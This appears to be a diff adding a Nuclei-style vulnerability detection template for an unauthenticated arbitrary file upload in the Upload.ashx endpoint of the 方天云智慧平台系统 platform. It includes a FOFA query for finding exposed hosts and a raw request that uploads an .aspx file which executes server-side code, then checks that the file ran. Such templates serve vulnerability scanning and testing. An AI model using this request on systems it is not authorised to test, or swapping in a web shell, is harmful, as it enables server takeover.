@@ -1,0 +1,47 @@
+id: fangtianyunzhihui-Upload-File-upload
+
+info:
+  name: 方天云智慧平台系统 Upload.ashx 任意文件上传漏洞
+  author: Superhero
+  severity: high
+  description: |-
+    fofa: body="AjaxMethods.asmx/GetCompanyItem"
+    方天云智慧平台系统 Upload.ashx 接口处存在任意文件上传漏洞，未经身份验证的攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。
+  reference:
+    - https://blog.csdn.net/m0_60571842/article/details/140918297
+  tags: File upload
+  
+http:
+  - raw:
+      - |
+        POST /Upload.ashx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundarySl8siBbmVicABvTX
+
+        ------WebKitFormBoundarySl8siBbmVicABvTX
+        Content-Disposition: form-data; name="file"; filename="qwe.aspx"
+        Content-Type: image/jpeg
+
+        <%@Page Language="C#"%><%Response.Write("pboyjnnrfipmplsukdeczudsefxmywe");System.IO.File.Delete(Request.PhysicalPath);%>
+        ------WebKitFormBoundarySl8siBbmVicABvTX--
+    extractors:
+       - type: regex 
+         part: body
+         name: uploadfile
+         group: 1
+         regex:
+            - '(\d+/\d+/\d+/\d+/[a-zA-Z0-9-]+\.aspx)'
+         internal: true
+  - raw:
+      - |
+        GET /UploadFile/CustomerFile/{{uploadfile}} HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'pboyjnnrfipmplsukdeczudsefxmywe'
+      - type: status
+        status: 
+          - 200
